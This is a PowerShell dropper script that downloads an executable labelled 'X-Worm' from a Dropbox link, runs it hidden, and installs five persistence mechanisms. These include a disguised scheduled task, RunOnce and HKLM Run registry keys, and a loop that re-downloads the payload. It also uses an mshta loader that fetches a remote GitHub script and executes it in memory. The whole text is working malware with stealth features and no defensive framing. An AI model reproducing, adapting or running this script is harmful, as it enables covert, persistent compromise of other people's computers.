$url = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'

Write-Host "🎯 Perfect stealth deploy (Zero errors + No PowerShell visible)..."

# CLEANUP
Get-Process | ? Name -like "*update*" | Stop-Process -Force -EA 0 2>$null
schtasks /delete /tn *Health* /f 2>$null
schtasks /delete /tn Sys* /f 2>$null

# 1. X-WORM (Direct Payload)
$wormPath = "$env:APPDATA\update.exe"
$bytes = (New-Object Net.WebClient).DownloadData($url)
[IO.File]::WriteAllBytes($wormPath, $bytes)
Start-Process $wormPath -WindowStyle Hidden
Write-Host "✅ X-Worm: $wormPath ($(($bytes.Length)/1KB)KB)"

# 2. TASK SCHEDULER METHOD (PowerShell NOT visible in startup)
$taskName = "SystemHealthCheck"
$taskCmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$u='$url';`$p='$wormPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}`""
schtasks /create /tn $taskName /tr $taskCmd /sc onlogon /rl highest /f 2>$null
Write-Host "✅ Task Scheduler: $taskName (Hidden PowerShell)"

# 3. RUNONCE BACKUP (Double persistence)
$monitorCmd = 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& {`$u=''' + $url + ''';`$p=''' + $wormPath + ''';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}"'
Set-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SysUpdate" -Value $monitorCmd -Force
Write-Host "✅ RunOnce backup: SysUpdate"

# 4. IMMEDIATE MONITOR (Background)
Start-Process "powershell" -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& {`$u='$url';`$p='$wormPath';while(`$true){Start-Sleep 300;if(!(Test-Path `$p)){(New-Object Net.WebClient).DownloadData(`$u)|Set-Content `$p -Enc Byte;Start-Process `$p -WindowStyle Hidden}}}`"" -WindowStyle Hidden

# 5. HKLM INVISIBLE GITHUB LOADER (New Addition)
# Uses mshta to run PowerShell without creating a console window handle.
# The command fetches your GitHub script and executes it in memory.
$githubUrl = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
$mshtaCmd = "mshta javascript:`"new ActiveXObject('Shell.Application').ShellExecute('powershell.exe','-w h -nop -ep by -c iwr $githubUrl|iex','','',0);close()`""

Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -Value $mshtaCmd -Force -EA 0
Write-Host "✅ HKLM SysDeploy: MSHTA → GitHub (0% Visible)"

Write-Host "🎉 ✅ PENTA PERSISTENCE LIVE (Unkillable)"
Write-Host "📍 X-Worm: $wormPath → Running"
Write-Host "📍 Task: $taskName"
Write-Host "📍 RunOnce: SysUpdate"
Write-Host "📍 HKLM: SysDeploy (Invisible MSHTA)"
Write-Host "🔄 REBOOT → CLEAN STARTUP"
